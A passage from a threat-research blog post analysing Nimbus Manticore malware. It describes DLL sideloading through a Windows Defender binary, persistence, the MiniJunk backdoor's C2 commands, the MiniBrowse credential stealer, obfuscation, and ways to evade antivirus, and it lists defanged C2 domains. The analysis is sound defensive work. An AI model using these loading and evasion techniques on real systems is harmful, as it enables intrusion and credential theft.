&lt;li&gt;&lt;strong&gt;Malware setup:&lt;/strong&gt;&amp;nbsp;&lt;code&gt;Setup.exe&lt;/code&gt;&amp;nbsp;starts another benign binary, a Windows Defender component called&amp;nbsp;&lt;code&gt;SenseSampleUploader.exe&lt;/code&gt;. This executable in turn sideloads the malware loader,&amp;nbsp;&lt;code&gt;xmllite.dll&lt;/code&gt;, from the archive’s directory.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Persistence:&lt;/strong&gt;&amp;nbsp;The loader copies&amp;nbsp;&lt;code&gt;Setup.exe&lt;/code&gt;&amp;nbsp;under its original name,&amp;nbsp;&lt;code&gt;MigAutoPlay.exe&lt;/code&gt;, and the malicious&amp;nbsp;&lt;code&gt;userenv.dll&lt;/code&gt;&amp;nbsp;that it sideloads, to the malware working directory&amp;nbsp;&lt;code&gt;%AppData%\Local\Microsoft\MigAutoPlay\.&lt;/code&gt;&amp;nbsp;It creates a scheduled task to run the executable.&lt;/li&gt;
&lt;/ul&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 3 - The contents of malicious ZIP archive downloaded from the
fake recruiting website." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image3.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 &amp;#8211; The contents of malicious ZIP archive downloaded from the fake recruiting website.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;h2 class="wp-block-heading" id="userenv.dll-in-the-malware-setup-stage"&gt;Userenv.dll in the malware setup stage&lt;/h2&gt;



&lt;p&gt;Once the initial Setup executable runs, it sideloads the&amp;nbsp;&lt;code&gt;userenv.dll&lt;/code&gt;&amp;nbsp;from the same folder. The DLL first checks the name of the executing PE module to determine the current stage of the infection chain. This way, if the DLL does not run from&amp;nbsp;&lt;code&gt;MigAutoPlay.exe&lt;/code&gt;&amp;nbsp;(meaning the setup of the backdoor did not occur yet), it will load the Loader DLL in a special way, exploiting undocumented low-level API to hijack the DLL loading path.&lt;/p&gt;



&lt;p&gt;&lt;code&gt;userenv.dll&lt;/code&gt;&amp;nbsp;uses low-level ntdll API calls to execute a Windows Defender binary located at&amp;nbsp;&lt;code&gt;C:\Program Files\Windows Defender Advanced Threat Protection\SenseSampleUploader.exe&lt;/code&gt;. The Windows Defender executable is vulnerable to DLL hijacking due to using the relative path to&amp;nbsp;&lt;code&gt;xmllite.dll&lt;/code&gt;. This flaw is abused to sideload the&amp;nbsp;&lt;code&gt;xmllite.dll&lt;/code&gt;. However, the actor manages to sideload it from the&amp;nbsp;&lt;strong&gt;same folder&lt;/strong&gt;&amp;nbsp;as the malicious archive as part of a unique multi-stage sideloading attack chain.&lt;/p&gt;



&lt;p&gt;Normally, a legitimate Windows Defender executable does not load random DLLs from folders outside the Windows DLL search order path. So, what’s happening here?&lt;/p&gt;



&lt;p&gt;When using low-level NT API calls to create a process, a call to&amp;nbsp;&lt;code&gt;RtlCreateProcessParameters&lt;/code&gt;&amp;nbsp;is mandatory to build a process parameter struct&amp;nbsp;&lt;code&gt;RTL_USER_PROCESS_PARAMETERS&lt;/code&gt;&amp;nbsp;which is then handed to&amp;nbsp;&lt;code&gt;RtlCreateUserProcess&lt;/code&gt;. A key field in this structure is the&amp;nbsp;&lt;code&gt;DllPath&lt;/code&gt;&amp;nbsp;parameter, which defines the search path that the process loader uses to locate and resolve imported modules. If set, it specifies the location where the loader should search for a DLL if it is not found in the application directory.&lt;/p&gt;



&lt;p&gt;The malware abuses this undocumented feature by using&amp;nbsp;&lt;code&gt;GetModuleHandle&lt;/code&gt;&amp;nbsp;to get a path to&amp;nbsp;&lt;code&gt;Setup.exe&lt;/code&gt;&amp;nbsp;and then provides it as a&amp;nbsp;&lt;code&gt;DllPath&lt;/code&gt;&amp;nbsp;parameter. As setup.exe and xmllite.dll are next to each other in the malicious archive, when the dll is not found next to&amp;nbsp;&lt;code&gt;SenseSampleUploader.exe&lt;/code&gt;, it will be loaded from the archive directory:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 4 - Windows Defender SenseSampleUploader.exe component search
for xmllite.dll, resulted in it loading from the archive folder." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image4.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 &amp;#8211; Windows Defender SenseSampleUploader.exe component search for xmllite.dll, resulted in it loading from the archive folder.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Once the&amp;nbsp;&lt;code&gt;xmllite.dll&lt;/code&gt;&amp;nbsp;is loaded, its actions are pretty straightforward. It creates a working folder under the path&amp;nbsp;&lt;code&gt;AppData\Local\Microsoft\MigAutoPlay\&lt;/code&gt;. It copies the backdoor&amp;nbsp;&lt;code&gt;userenv.dll&lt;/code&gt;&amp;nbsp;to it, also places the legitimate executable there as&amp;nbsp;&lt;code&gt;MigAutoPlay.exe&lt;/code&gt;, and then adds an auto-run registry key to execute the benign executable.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 5 - Sideloading of userenv.dll." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image5.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5 &amp;#8211; Sideloading of userenv.dll.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;After persistence is completed, the malware is launched through the&amp;nbsp;&lt;code&gt;MigAutoPlay.exe&lt;/code&gt;, which sideloads&amp;nbsp;&lt;code&gt;userenv.dll&lt;/code&gt;&amp;nbsp;and shows the victim a fake error pop-up about network issues blocking the lure program from running.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 6 - Fake error at the end of the malware setup process." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image6.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6 &amp;#8211; Fake error at the end of the malware setup process.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;h2 class="wp-block-heading" id="the-backdoor-minijunk"&gt;The Backdoor: MiniJunk&lt;/h2&gt;



&lt;p&gt;In the last year, the actor introduced a lot of changes to the backdoor, first documented by Mandiant as “Minibike.” We chose to track this sample as “MiniJunk.”&lt;/p&gt;



&lt;p&gt;The&amp;nbsp;&lt;code&gt;userenv.dll&lt;/code&gt;&amp;nbsp;backdoor core logic starts from the DLLMain function. The backdoor first resolves many imports needed for it to function, but oddly enough, when it wants to use a function that was already resolved, it resolves it again. This behavior is unusual, but it might have been leveraged in the development cycle to identify API resolution issues. The backdoor then collects two identifiers from the infected system: the&amp;nbsp;&lt;strong&gt;computer name&lt;/strong&gt;&amp;nbsp;and the&amp;nbsp;&lt;strong&gt;domain name with the username&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Although the sample employs a substantial amount of obfuscation (which is discussed in detail in the next section), it does not encrypt the network data. Instead, it encodes it. We saw similar samples in the past that used a simple encryption on the network data, such as XOR with a few bytes. In this case, however, it uses a simple encoding algorithm: data is collected in a wide string, then converted to bytes, and the bytes are reversed. Finally, the entire string is reversed.&lt;/p&gt;



&lt;p&gt;When the main logic starts, the backdoor checks if the running executable is called&amp;nbsp;&lt;code&gt;MigAutoPlay.exe&lt;/code&gt;&amp;nbsp;(meaning the backdoor is running after the setup from its permanent working directory) and hooks the&amp;nbsp;&lt;code&gt;ExitProcess&lt;/code&gt;&amp;nbsp;function to a function that sleeps, probably preventing fatal exits or allowing other threads to run in case of a program crash:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 7 - ExitProcess function hook." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image7.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 &amp;#8211; ExitProcess function hook.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;After initialization, the backdoor starts a main thread that handles networking and the remaining logic. Analyzing the sample in this part is quite tricky: the logic is heavily branched through functions that utilize various states, for example, a large number of classes for network requests, and obfuscations in combination with library functions. However, all of this ultimately masks simple backdoor functionality.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="command-and-control"&gt;Command and Control&lt;/h3&gt;



&lt;p&gt;The backdoor variants typically utilize multiple command and control (C2) servers in rotation for redundancy. There are several (between three to five) hardcoded C2 servers, so if one C2 goes down, the next one in the list will be used. The backdoor uses regular HTTPS requests using the Windows API. When the C2 responds, a thread is created to parse the C2 request. The C2 responds using encoded strings, similar to the initial network data. The response structure consists of a string separated by&amp;nbsp;&lt;code&gt;##&lt;/code&gt;. It is parsed by the backdoor and split into a vector of strings. Most C2 commands need 3 values:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Command settings&lt;/li&gt;



&lt;li&gt;Command ID&lt;/li&gt;



&lt;li&gt;Command argument&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;For example, a “read file” command looks like this:&lt;/p&gt;



&lt;p&gt;&lt;code&gt;##[chunks size]##[read file command id]##[file path]&lt;/code&gt;&lt;/p&gt;



&lt;p&gt;After parsing the command, in this case, the backdoor sends the file from the specified path via several network requests, based on the chunk size provided as an argument. The backdoor supports the following commands:&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Command Id&lt;/th&gt;&lt;th&gt;Description&lt;/th&gt;&lt;th&gt;Arguments&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;Collect computer name, domain name with the username&lt;/td&gt;&lt;td&gt;None&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Get computer name&lt;/td&gt;&lt;td&gt;None&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;Read a file and send it back&lt;/td&gt;&lt;td&gt;File path / chunks&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;Create file&lt;/td&gt;&lt;td&gt;File path, URL to the fille on the C2&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;List hard drives / List files in a folder&lt;/td&gt;&lt;td&gt;String to list all hard drives or a directory path to list all files in&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Delete file&lt;/td&gt;&lt;td&gt;File path&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;Create a process and use a named pipe for its output&lt;/td&gt;&lt;td&gt;Process path&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;7&lt;/td&gt;&lt;td&gt;Load DLL&lt;/td&gt;&lt;td&gt;DLL path&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;8 / 9&lt;/td&gt;&lt;td&gt;Do nothing / Placeholder&lt;/td&gt;&lt;td&gt;None&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;Move / Rename file&lt;/td&gt;&lt;td&gt;File target, File destination&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;11&lt;/td&gt;&lt;td&gt;Not implemented&lt;/td&gt;&lt;td&gt;None&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;As can be seen by the functions, these are pretty standard for a backdoor. The real complexity in the samples comes from their obfuscations which make the samples harder to analyze.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="minibrowse---stealer-component"&gt;MiniBrowse &amp;#8211; Stealer component&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;MiniBrowse&lt;/strong&gt;&amp;nbsp;is a lightweight stealer used by Nimbus Manticore. We observed two variants, one to steal Chrome credentials and another which targets Edge. Both versions are DLL designed to be injected into browsers to steal the stored passwords.&lt;/p&gt;



&lt;p&gt;After it’s executed, MiniBrowse first collects two identifiers from the system, username and domain name, and then connects to a predefined endpoint on the C2 server sending data in JSON payload.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 8 - MiniBrowse sends victim data." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image8.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 &amp;#8211; MiniBrowse sends victim data.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;We identified a unique network communication behavior, as the C2 needs to respond with any HTTP response except for 200. If it does, the backdoor continues its execution looking for several files related to Edge login data.&lt;/p&gt;



&lt;p&gt;Each of those files is then exfiltrated to the C2, using a simple POST request:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 9 - MiniBrowse exfiltrating data stolen from Edge browser." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image9.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9 &amp;#8211; MiniBrowse exfiltrating data stolen from Edge browser.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Another method of sending those files is through connecting and sending the JSONs to a named pipe. We identified multiple MiniBrowse versions with support for this functionality.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="obfuscation"&gt;&lt;strong&gt;Obfuscation&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;The MiniJunk and MiniBrowse samples that we investigated exhibit heavy compiler‑level code obfuscation, possibly implemented via custom LLVM passes. We had to address several obfuscation techniques to facilitate analysis, including junk code insertion, control‑flow obfuscation, opaque predicates, obfuscated function calls, and encrypted strings. The attacker invested significant effort in developing these LLVM passes and continues to refine them; each “generation” of samples shows improvements over the previous one, typically introduced between campaigns. The actor appears to be targeting a substantial number of victims, and these obfuscations help the malware remain undetected while at the same time slowing down researchers trying to determine the samples’ behavior. As with most obfuscation, no single tool addresses all cases: off‑the‑shelf tools often fail unless the scheme matches a generic framework such as OLLVM &amp;#8211; which is not the case here. This underscores the attacker’s willingness to invest in their toolset and, conversely, benefits researchers by exposing new techniques. We invested considerable effort to make the samples sufficiently “reversible” for analysis.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="function-call-obfuscations"&gt;Function call obfuscations&lt;/h3&gt;



&lt;p&gt;The backdoors contain compiler-level obfuscation. As a result, almost all function calls are obfuscated. The decision on what function to call is based on several arithmetic operations, which are then stored in the RAX register. Here is an example of a DLL’s primary function:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 10 - DLL’s primary function with obfuscated function
calls." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image10.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10 &amp;#8211; DLL’s primary function with obfuscated function calls.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;h3 class="wp-block-heading" id="obfuscated-control-flow"&gt;Obfuscated Control Flow&lt;/h3&gt;



&lt;p&gt;Not only are function calls obfuscated, but there are also obfuscated branches inside functions.&lt;/p&gt;



&lt;p&gt;In this next example, there is a JMP RAX instruction, but it’s not a single JMP. Depending on various conditions that are met when the code is running, the JMP can lead to two different places, just like a conditional JMP, but masked as a single JMP.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 11 - Obfuscated branch." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image11.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11 &amp;#8211; Obfuscated branch.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;h3 class="wp-block-heading" id="string-encryption"&gt;String encryption&lt;/h3&gt;



&lt;p&gt;Each string is individually encrypted with its own key. The encrypted bytes are stored in memory with the key placed at the end of each string. Each string gets its own decryption function, adding another layer of complexity. To top it off, the decryption routines are each overloaded with opaque predicates:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 12 - String encryption." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image12.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12 &amp;#8211; String encryption.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;We used LLM to simplify the function mentioned above. Eventually the encryption algorithm is just&amp;nbsp;&lt;code&gt;string[i] ^ key[i % key_length]&lt;/code&gt;. Once we established that, we were able to automate and decrypt all strings.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="junk-code"&gt;Junk code&lt;/h3&gt;



&lt;p&gt;The samples contain a bit of unused junk code:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 13 - Functions with junk code." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image13.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13 &amp;#8211; Functions with junk code.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Distinct patterns helped us deduce that a “block” of instructions can be classified as junk code, highly repetitive in the code. Then we can exclude it in the decompile view, and continue with static analysis:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 14 - The same function without junk code." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image14.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 14 &amp;#8211; The same function without junk code.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;h2 class="wp-block-heading" id="the-evolution-of-minijunk"&gt;The evolution of MiniJunk&lt;/h2&gt;



&lt;p&gt;Over the past year, MiniJunk has undergone many changes and incorporated a variety of techniques. In this section, we describe the most significant.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="signing"&gt;Signing&lt;/h3&gt;



&lt;p&gt;In May, Nimbus Manticore started to use the service&amp;nbsp;&lt;a href="http://SSL.com"&gt;SSL.com&lt;/a&gt;&amp;nbsp;to sign their code. This led to a drastic decrease in detections, with many samples remaining undetectable by multiple malware engines.&lt;/p&gt;



&lt;p&gt;Based on the signing dates and our analysis of samples signed by this certificate, we determined that they were generated by the threat actor, masquerading as existing IT organizations in Europe.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="command-and-control-1"&gt;Command and control&lt;/h3&gt;



&lt;p&gt;In June, the actor re‑architected C2 to combine Cloudflare and Azure App Service. This improved the resiliency so execution could continue even if a provider or domain was suspended.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="file-size-and-detections"&gt;File Size and detections&lt;/h3&gt;



&lt;p&gt;Large malware files often have lower endpoint detection, as many Antivirus engines enforce time, size, and resource limits that truncate deep unpacking, emulation, and heuristic layers on oversized inputs. Nimbus Manticore exploits this by inflating binaries with inert junk code blocks. Feature extraction and ML models frequently cap analysis to the first portion of a file, so padding pushes discriminative byte patterns past those limits, while some engines simply skip or downgrade scanning of large files to avoid false positives and performance hits. The combination of obfuscations, size, and codesigning result in lower endpoint detection. As you can see, some of the largest samples remained with zero detections on VirusTotal:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 15 - MiniJunk with zero detection in VirusTotal." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image15.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 15 &amp;#8211; MiniJunk with zero detection in VirusTotal.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;h2 class="wp-block-heading" id="separate-cluster-of-activity"&gt;Separate Cluster of Activity&lt;/h2&gt;



&lt;p&gt;In addition to the operations involving the MiniJunk backdoor we described earlier in this blog, we observed a separate but closely related activity cluster. This cluster, first&amp;nbsp;&lt;a href="https://github.com/prodaft/malware-ioc/tree/master/SubtleSnail"&gt;reported&lt;/a&gt;&amp;nbsp;by PRODAFT, employs TTPs that broadly align with those documented above, but is distinguished by much smaller payloads and a lack of sophisticated obfuscation.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="spear-phishing-emails"&gt;Spear phishing emails&lt;/h3&gt;



&lt;p&gt;Check Point Harmony Email &amp;amp; Collaboration platform identified and blocked a spear-phishing attack against a telecommunication provider in Israel.&lt;/p&gt;



&lt;p&gt;As documented in past intrusions, the attacker uses professional social media such as LinkedIn, masquerades as an HR specialist, then asks the target to move to another platform such as email.&lt;/p&gt;



&lt;p&gt;A malicious email sent from an Outlook account with a job application invitation:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 16 – Malicious email sent by Nimbus Manticore." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image16.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 16 – Malicious email sent by Nimbus Manticore.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;As previously observed in other Nimbus Manticore campaigns, the link leads to a React-based fake recruiting login page:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 17 - Fake page delivering malware after login." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image17.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 17 &amp;#8211; Fake page delivering malware after login.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;h3 class="wp-block-heading" id="payload"&gt;Payload&lt;/h3&gt;



&lt;p&gt;The malware used in this operation is delivered through DLL hijacking of&amp;nbsp;&lt;code&gt;dxgi.dll&lt;/code&gt;:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 18 - Contents of the malware folder." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image18.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 18 &amp;#8211; Contents of the malware folder.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The malware strings were obfuscated by using simple one-byte XOR with&amp;nbsp;&lt;code&gt;0x55&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;The execution started by decrypting 5 predefined C&amp;amp;C servers:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;services-update-check.azurewebsites[.]net
send-feedback.azurewebsites[.]net
send-feedback-413.azurewebsites[.]net
send-feedback-838.azurewebsites[.]net
send-feedback-296.azurewebsites[.]net&lt;/pre&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 19 - C2 domain encryption." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image19.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 19 &amp;#8211; C2 domain encryption.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Despite overlapping infection chain steps and infrastructure,&amp;nbsp;&lt;code&gt;dxgi&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;MiniJunk&lt;/code&gt;&amp;nbsp;implement different command sets. At the same time,&amp;nbsp;&lt;code&gt;dxgi&lt;/code&gt;&amp;nbsp;does not exhibit evasion or obfuscation techniques. All this indicates parallel activity that could be conducted by more than one actor.&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Command ID&lt;/th&gt;&lt;th&gt;Behavior (high-level)&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;Do nothing&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Get computer name&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;Get username&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;List files and folders in a directory&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;Delete a file&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Move / rename a file&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;Enumerate hard drives&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;7&lt;/td&gt;&lt;td&gt;Upload a file&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;8&lt;/td&gt;&lt;td&gt;Get a list of running processes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;Kill a process&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;Execute a bat/exe/cmd command/load dll&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;11&lt;/td&gt;&lt;td&gt;Create a process and use a named pipe for its output&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;12&lt;/td&gt;&lt;td&gt;Load a DLL&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="comparison-to-minijunk"&gt;Comparison to MiniJunk&lt;/h3&gt;



&lt;p&gt;&lt;code&gt;dxgi.dll&lt;/code&gt;&amp;nbsp;and MiniJunk samples overlap in multiple details: they hook the exit process in a very similar way, and they both collect the username and desktop name (but the new sample also collects adapter information).&lt;/p&gt;



&lt;p&gt;In terms of C2 communication, the key similarities lie in two areas: the parsing of network responses from C2 server, and the set of C2 commands.&lt;/p&gt;



&lt;p&gt;The responses from C2 to MiniJunk use various separators for the data, such as&amp;nbsp;&lt;code&gt;###&lt;/code&gt;&amp;nbsp;or&amp;nbsp;&lt;code&gt;---&lt;/code&gt;. The&amp;nbsp;&lt;code&gt;dxgi.dll&lt;/code&gt;&amp;nbsp;backdoor includes an additional verification of the request by hashing one of the parameters with FNV and comparing the result with a generated value. Overall, the C2 communication between these backdoors is not identical but is still quite similar.&lt;/p&gt;



&lt;p&gt;The C2 commands in both versions closely resemble each other, with very similar logic and an identical order of operations within the functions themselves. While the command ID varies, the underlying code base appears to be the same.&lt;/p&gt;



&lt;p&gt;Regarding significant differences, for network communications,&amp;nbsp;&lt;code&gt;dxgi.dll&lt;/code&gt;&amp;nbsp;adds a layer of encryption. In addition, the backdoor utilizes the WinHTTP API, but unlike MiniJunk which employs classes and branching on network requests, this current backdoor handles all network logic within a single function. Finally, it appears the backdoor developer didn’t bother changing the user agent, instead keeping it as is&amp;nbsp;&lt;code&gt;WinHTTP Example:&lt;/code&gt;&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 20 - Network communications using WinHTTP API and a sample
user agent." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image20.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 20 &amp;#8211; Network communications using WinHTTP API and a sample user agent.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The findings above suggest&amp;nbsp;&lt;code&gt;dxgi.dll&lt;/code&gt;&amp;nbsp;shares a common code base with MiniJunk versions. Both of the activity clusters may have access to the code base, and can modify the code as needed, adding compiler passes, and altering the logic slightly. At the same time, the&amp;nbsp;&lt;strong&gt;programming paradigm remains similar&lt;/strong&gt;. This is hard to notice at first, due to MiniJunk obfuscations, the different layout of the HTTP request method (classes vs non-classes), and other variations. But once the obfuscations are addressed, it becomes clear that they share the same code base.&lt;/p&gt;

&lt;p&gt;MiniJunk campaigns use long, concatenated health-themed subdomains of azurewebsites[.]net. Notably, the domain naming convention in this campaign is different: the unique domain pattern is&amp;nbsp;&lt;code&gt;[a-z]-[a-z]+-[a-z]+-[0-9]{3}.azurewebsites.net&lt;/code&gt;&amp;nbsp;combining multiple words joined by hyphen separators.&lt;/p&gt;



&lt;p&gt;While hunting for these domain naming conventions, we observed a distinct set of domains used to target Europe which featured the following sequence of malicious domains:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;code&gt;telespazio-careers[.]com&lt;/code&gt;&amp;nbsp;&amp;#8211; Lure website&lt;/li&gt;



&lt;li&gt;&lt;code&gt;update-health-service[.]azurewebsites[.]net&lt;/code&gt;&amp;nbsp;&amp;#8211; First observed Azure app service domain (mentioned by PRODAFT)&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;We were able to capture the following domain block, which we believe is unique for each sample:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;check-backup-service.azurewebsites[.]net
check-backup-service-288.azurewebsites[.]net
check-backup-service-179.azurewebsites[.]net
check-backup-service-736.azurewebsites[.]net&lt;/pre&gt;



